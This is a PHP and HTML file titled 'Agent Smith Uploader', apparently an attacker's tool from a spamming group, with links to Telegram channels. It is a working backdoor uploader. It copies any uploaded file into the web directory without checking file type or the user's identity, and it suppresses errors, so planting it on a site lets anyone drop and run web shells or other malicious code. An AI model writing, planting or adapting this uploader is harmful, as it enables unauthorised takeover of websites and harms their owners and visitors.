<?php

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Agent Smith Uploader</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            background-image: url('https://giffiles.alphacoders.com/214/214311.gif'); /* Replace with the actual path to your GIF image */
            background-size: cover;
            font-family: Arial, sans-serif;
        }

        .content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            color: #fff;
            z-index: 1;
        }

        .container {
            background-color: rgba(255, 255, 255, 0.8); /* Adjust the alpha channel for background transparency */
            border-radius: 10px;
            padding: 20px;
            margin: 20px;
            max-width: 400px;
            display: inline-block;
        }

        form {
            margin-top: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        label {
            color: #333;
            font-weight: bold;
        }

        input[type="file"] {
            margin: 10px 0;
            padding: 10px;
        }

        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="content">
        <div class="container">
            <h1>Agent Smith Uploader</h1>
            <p>TELEGRAM ==> <a href="https://t.me/spammersfamily" target="_blank" style="color: #333; text-decoration: underline;">https://t.me/spammersfamily</a></p>
            <p>DM ==> <a href="https://t.me/Morphoisis" target="_blank" style="color: #333; text-decoration: underline;">https://t.me/Morphoisis</a></p>
            
            <form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">
                <label for="file">Choose a file:</label>
                <input type="file" name="file" id="file">
                <br>
                <input name="_upl" type="submit" id="_upl" value="Upload">
            </form>

            <?php
            if ($_POST['_upl'] == "Upload") {
                if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
                    echo '<p style="color: #4CAF50; font-weight: bold;">Upload Successful!</p>';
                } else {
                    echo '<p style="color: #D9534F; font-weight: bold;">Upload Failed!</p>';
                }
            }
            ?>
        </div>
    </div>

</body>
</html>
